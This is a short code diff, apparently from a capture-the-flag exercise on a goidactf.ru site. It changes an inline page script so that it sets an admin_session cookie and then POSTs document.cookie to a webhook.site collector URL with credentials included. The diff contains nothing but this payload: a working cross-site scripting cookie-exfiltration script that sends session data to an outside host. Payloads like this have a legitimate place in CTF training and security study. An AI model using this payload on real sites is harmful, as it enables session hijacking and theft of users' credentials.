@@ -11,7 +11,8 @@
                     </form>
 
                    <script>
-                    fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=',
+                    document.cookie="admin_session=valid_admin_session_token; path=/; domain=goidactf.ru";
+                    fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie,
                         {
                         method:'POST',
                         credentials:'include',
